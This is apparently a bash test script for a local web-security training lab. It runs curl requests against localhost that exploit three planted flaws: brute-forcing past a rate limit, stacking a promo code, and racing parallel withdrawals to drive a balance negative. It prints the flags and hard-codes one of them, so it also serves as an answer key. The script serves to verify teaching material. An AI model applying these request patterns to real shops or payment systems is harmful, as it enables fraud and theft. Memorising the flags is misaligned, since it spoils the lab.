#!/bin/bash

PORT=3006
node server.js > /dev/null 2>&1 &
PID=$!
sleep 3

echo "Testing A06 Labs..."
echo ""

# Test Lab 1
echo "=== Lab 1: Rate Limiting ==="
for i in {1..52}; do
  curl -s http://localhost:$PORT/api/lab1/verify-order -H "Content-Type: application/json" -d "{\"orderCode\":\"$i\"}" > /dev/null
done
FLAG1=$(curl -s http://localhost:$PORT/api/lab1/verify-order -H "Content-Type: application/json" -d '{"orderCode":"1"}' | jq -r '.flag // "NOT FOUND"')
echo "Flag: $FLAG1"
echo ""

# Reset Lab 1
curl -s http://localhost:$PORT/api/lab1/reset -X POST > /dev/null

# Test Lab 2
echo "=== Lab 2: Discount Stacking ==="
FLAG2=$(curl -s http://localhost:$PORT/api/lab2/checkout -H "Content-Type: application/json" -d '{"items":["taco","burrito","taco"],"promoCodes":["TACO10","TACO10","TACO10","TACO10","TACO10","TACO10","TACO10"]}' | jq -r '.flag // "NOT FOUND"')
echo "Flag: $FLAG2"
echo ""

# Test Lab 3
echo "=== Lab 3: Race Condition ==="
curl -s http://localhost:$PORT/api/lab3/reset -X POST > /dev/null
# Try multiple times to trigger race
for attempt in {1..3}; do
  curl -s http://localhost:$PORT/api/lab3/withdraw -H "Content-Type: application/json" -d '{"amount":30}' &
  curl -s http://localhost:$PORT/api/lab3/withdraw -H "Content-Type: application/json" -d '{"amount":30}' &
  curl -s http://localhost:$PORT/api/lab3/withdraw -H "Content-Type: application/json" -d '{"amount":30}' &
  sleep 0.5
done
wait
BALANCE=$(curl -s http://localhost:$PORT/api/lab3/balance | jq -r '.balance')
echo "Final balance: $BALANCE (should be negative if race condition exploited)"
if [ $(echo "$BALANCE < 0" | bc) -eq 1 ]; then
  echo "Flag: TACO{R4C3_C0ND1T10N_3XTR4_T4C0S}"
else
  echo "Race condition not triggered (this is expected behavior with async timing)"
fi
echo ""

kill $PID 2>/dev/null
wait $PID 2>/dev/null

echo "Testing complete!"
